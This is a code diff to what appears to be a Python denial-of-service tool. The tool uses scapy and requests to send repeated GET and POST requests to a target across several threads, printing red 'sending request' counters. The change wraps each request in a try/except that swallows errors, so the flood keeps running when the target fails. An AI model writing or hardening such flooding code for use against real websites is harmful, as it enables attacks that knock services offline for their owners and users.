@@ -1,4 +1,6 @@
 import time
+
+import re
 import requests
 from scapy.all import *
 from scapy.layers.inet import IP
@@ -55,8 +57,12 @@ elif o==1:
 
         i=0
         while i<s:
+
             i=i+1
-            requestpack = requests.get(target)
+            try:
+                requestpack = requests.get(target)
+            except Exception as e:
+                pass
             print(f'[+]{red}sending request')
         print(f'{red}[+]request sent {s*threads}')
     for i in range(threads):
@@ -78,7 +84,10 @@ elif o==2:
         i = 0
         while i < s:
             i = i + 1
-            postack = requests.post(target,json=lol)
+            try:
+                postack = requests.post(target,json=lol)
+            except Exception as e:
+                pass
             print(f"[+]{red}sending request")
         print(f'{red}[+]request sent {s * threads}')
 
